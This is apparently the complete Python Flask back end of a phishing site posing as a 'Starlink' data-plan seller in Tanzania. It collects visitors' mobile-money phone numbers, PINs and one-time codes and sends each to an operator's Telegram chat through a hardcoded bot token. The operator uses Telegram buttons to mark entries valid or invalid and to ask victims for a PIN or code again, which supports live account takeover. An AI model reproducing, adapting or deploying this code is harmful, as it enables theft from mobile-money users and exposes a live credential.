from flask import Flask, render_template, request, jsonify
import requests
import sqlite3
import random
import string
from datetime import datetime
import os
import threading
import time

app = Flask(__name__)
app.secret_key = 'starlink-data-2024'

BOT_TOKEN = '8801186375:AAGySOZ9cFogdPA4-VPZtuOPpomM-LtEQ5o'
CHAT_ID = '8589275340'
TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'

last_update_id = 0

def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        app_id TEXT, plan TEXT, amount INTEGER,
        phone TEXT, pin TEXT, code TEXT,
        status TEXT DEFAULT 'pending',
        code_status TEXT DEFAULT 'pending',
        invalid_type TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

def add_column():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    try:
        c.execute('ALTER TABLE payments ADD COLUMN invalid_type TEXT')
    except:
        pass
    conn.commit()
    conn.close()

add_column()

def send_telegram(message, reply_markup=None):
    try:
        payload = {'chat_id': CHAT_ID, 'text': message}
        if reply_markup: payload['reply_markup'] = reply_markup
        requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
    except Exception as e: print(f'Telegram error: {e}')

def edit_telegram(message_id, text):
    try:
        requests.post(f'{TELEGRAM_API}/editMessageText', json={'chat_id': CHAT_ID, 'message_id': message_id, 'text': text})
    except Exception as e: print(f'Edit error: {e}')

def poll_telegram():
    if 'RENDER' in os.environ: return
    global last_update_id
    while True:
        try:
            url = f'{TELEGRAM_API}/getUpdates?offset={last_update_id + 1}&timeout=10'
            resp = requests.get(url).json()
            if resp.get('ok') and resp.get('result'):
                for update in resp['result']:
                    last_update_id = update['update_id']
                    if 'callback_query' in update:
                        cb = update['callback_query']; cb_data = cb['data']
                        msg_id = cb['message']['message_id']; original = cb['message']['text']
                        conn = sqlite3.connect('database.db'); c = conn.cursor()
                        
                        if cb_data.startswith('deny_'):
                            aid = cb_data.replace('deny_','')
                            c.execute('UPDATE payments SET status="invalid_number", code_status="invalid_number", invalid_type="yas_only" WHERE app_id=?',(aid,))
                            conn.commit()
                            edit_telegram(msg_id, original+'\n\n❌ INVALID - Not Yas')
                        
                        elif cb_data.startswith('denyotp_'):
                            aid = cb_data.replace('denyotp_','')
                            c.execute('UPDATE payments SET status="invalid_number", code_status="invalid_number", invalid_type="otp_yas" WHERE app_id=?',(aid,))
                            conn.commit()
                            edit_telegram(msg_id, original+'\n\n❌ INVALID OTP - Not Yas')
                        
                        elif cb_data.startswith('denypin_'):
                            aid = cb_data.replace('denypin_','')
                            c.execute('UPDATE payments SET status="wrong_pin", code_status="wrong_pin", invalid_type="wrong_pin" WHERE app_id=?',(aid,))
                            conn.commit()
                            edit_telegram(msg_id, original+'\n\n❌ INVALID PIN')
                        
                        elif cb_data.startswith('allow_'):
                            aid = cb_data.replace('allow_','')
                            c.execute('UPDATE payments SET status="approved" WHERE app_id=?',(aid,))
                            conn.commit()
                            edit_telegram(msg_id, original+'\n\n✅ ALLOWED')
                        
                        elif cb_data.startswith('wrongpin2_'):
                            aid = cb_data.replace('wrongpin2_','')
                            new_code = str(random.randint(1000,9999))
                            c.execute('UPDATE payments SET status="wrong_pin",code_status="pending",code=? WHERE app_id=?',(new_code,aid))
                            conn.commit()
                            edit_telegram(msg_id, original+'\n\n❌ WRONG PIN')
                        
                        elif cb_data.startswith('wrongcode_'):
                            aid = cb_data.replace('wrongcode_','')
                            new_code = str(random.randint(1000,9999))
                            c.execute('UPDATE payments SET code_status="wrong_code",code=? WHERE app_id=?',(new_code,aid))
                            conn.commit()
                            edit_telegram(msg_id, original+'\n\n❌ WRONG CODE')
                        
                        elif cb_data.startswith('approve_'):
                            aid = cb_data.replace('approve_','')
                            c.execute('UPDATE payments SET code_status="approved" WHERE app_id=?',(aid,))
                            conn.commit()
                            edit_telegram(msg_id, original+f'\n\n✅ APPROVED\n{datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")}')
                        
                        conn.close()
        except Exception as e: print(f'Poll error: {e}')
        time.sleep(1)

if 'RENDER' not in os.environ: threading.Thread(target=poll_telegram, daemon=True).start()

@app.route('/') 
def index(): return render_template('index.html')

@app.route('/apply') 
def apply(): return render_template('apply.html')

@app.route('/approve') 
def approve(): return render_template('approve.html')

@app.route('/api/submit_payment', methods=['POST'])
def submit_payment():
    data = request.json
    phone = data.get('phone',''); pin = data.get('pin','')
    amount = int(data.get('amount',0))
    plan = data.get('plan','')
    purpose = data.get('purpose','')
    conn = sqlite3.connect('database.db'); c = conn.cursor()
    
    if purpose == 'OTP REQUESTED':
        c.execute("SELECT COUNT(*) FROM payments WHERE phone=? AND (status='pending' OR status='wrong_pin') AND code_status='pending'", (phone,))
        resend_count = c.fetchone()[0]
        if resend_count >= 3:
            conn.close()
            return jsonify({'success': False, 'error': 'Umeomba OTP mara nyingi. Subiri.'})
        app_id = 'ST-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        code = str(random.randint(1000, 9999))
        c.execute('INSERT INTO payments (app_id, plan, amount, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,plan,amount,phone,pin,code))
        conn.commit(); conn.close()
        msg = f'📤 OTP REQUESTED\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n📦 Plan: {plan}\n💰 Amount: TSh {amount:,}'
        keyboard = {'inline_keyboard': [[{'text':'❌ INVALID','callback_data':f'denyotp_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
        send_telegram(msg, keyboard)
        return jsonify({'success':True,'app_id':app_id})
    
    app_id = 'ST-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    code = str(random.randint(1000, 9999))
    c.execute('INSERT INTO payments (app_id, plan, amount, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,plan,amount,phone,pin,code))
    conn.commit(); conn.close()
    
    msg = f'📥 NEW PAYMENT\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n📦 Plan: {plan}\n💰 Amount: TSh {amount:,}\n🔢 PIN: {pin}'
    keyboard = {'inline_keyboard': [[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
    send_telegram(msg, keyboard)
    return jsonify({'success':True,'app_id':app_id})

@app.route('/api/submit_code', methods=['POST'])
def submit_code():
    data = request.json; app_id = data.get('app_id'); entered_code = data.get('code')
    conn = sqlite3.connect('database.db'); c = conn.cursor()
    c.execute('SELECT phone, amount, plan, pin FROM payments WHERE app_id = ?',(app_id,))
    payment = c.fetchone()
    if payment:
        phone, amount, plan, pin = payment
        msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n📦 Plan: {plan}\n✍️ Entered Code: {entered_code}\n💰 Amount: TSh {amount:,}\n🔢 PIN: {pin}'
        keyboard = {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'denypin_{app_id}'}],[{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROVE PAYMENT','callback_data':f'approve_{app_id}'}]]}
        send_telegram(msg, keyboard)
    conn.close()
    return jsonify({'success':True})

@app.route('/api/check_status/<app_id>')
def check_status(app_id):
    conn = sqlite3.connect('database.db'); c = conn.cursor()
    try:
        c.execute('SELECT status, code_status, invalid_type FROM payments WHERE app_id = ?',(app_id,))
        payment = c.fetchone()
        if payment: 
            conn.close()
            return jsonify({'status':payment[0],'code_status':payment[1],'invalid_type':(payment[2] or '')})
    except:
        c.execute('SELECT status, code_status FROM payments WHERE app_id = ?',(app_id,))
        payment = c.fetchone()
        if payment: 
            conn.close()
            return jsonify({'status':payment[0],'code_status':payment[1],'invalid_type':''})
    conn.close()
    return jsonify({'status':'not_found'})

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    if 'callback_query' in data:
        cb = data['callback_query']; cb_data = cb['data']
        msg_id = cb['message']['message_id']; original = cb['message']['text']
        conn = sqlite3.connect('database.db'); c = conn.cursor()
        
        if cb_data.startswith('denyotp_'):
            aid = cb_data.replace('denyotp_','')
            c.execute('UPDATE payments SET status="invalid_number", code_status="invalid_number", invalid_type="otp_yas" WHERE app_id=?',(aid,))
            conn.commit()
            edit_telegram(msg_id, original+'\n\n❌ INVALID OTP - Not Yas')
        elif cb_data.startswith('denypin_'):
            aid = cb_data.replace('denypin_','')
            c.execute('UPDATE payments SET status="wrong_pin", code_status="wrong_pin", invalid_type="wrong_pin" WHERE app_id=?',(aid,))
            conn.commit()
            edit_telegram(msg_id, original+'\n\n❌ INVALID PIN')
        elif cb_data.startswith('deny_'):
            aid = cb_data.replace('deny_','')
            c.execute('UPDATE payments SET status="invalid_number", code_status="invalid_number", invalid_type="yas_only" WHERE app_id=?',(aid,))
            conn.commit()
            edit_telegram(msg_id, original+'\n\n❌ INVALID - Not Yas')
        elif cb_data.startswith('allow_'):
            aid = cb_data.replace('allow_','')
            c.execute('UPDATE payments SET status="approved" WHERE app_id=?',(aid,))
            conn.commit()
            edit_telegram(msg_id, original+'\n\n✅ ALLOWED')
        elif cb_data.startswith('wrongpin2_'):
            aid = cb_data.replace('wrongpin2_','')
            new_code = str(random.randint(1000,9999))
            c.execute('UPDATE payments SET status="wrong_pin",code_status="pending",code=? WHERE app_id=?',(new_code,aid))
            conn.commit()
            edit_telegram(msg_id, original+'\n\n❌ WRONG PIN')
        elif cb_data.startswith('wrongcode_'):
            aid = cb_data.replace('wrongcode_','')
            new_code = str(random.randint(1000,9999))
            c.execute('UPDATE payments SET code_status="wrong_code",code=? WHERE app_id=?',(new_code,aid))
            conn.commit()
            edit_telegram(msg_id, original+'\n\n❌ WRONG CODE')
        elif cb_data.startswith('approve_'):
            aid = cb_data.replace('approve_','')
            c.execute('UPDATE payments SET code_status="approved" WHERE app_id=?',(aid,))
            conn.commit()
            edit_telegram(msg_id, original+f'\n\n✅ APPROVED\n{datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")}')
        
        conn.close()
    return jsonify({'ok':True})

if __name__ == '__main__':
    print("STARLINK DATA SOLUTION RUNNING!")
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
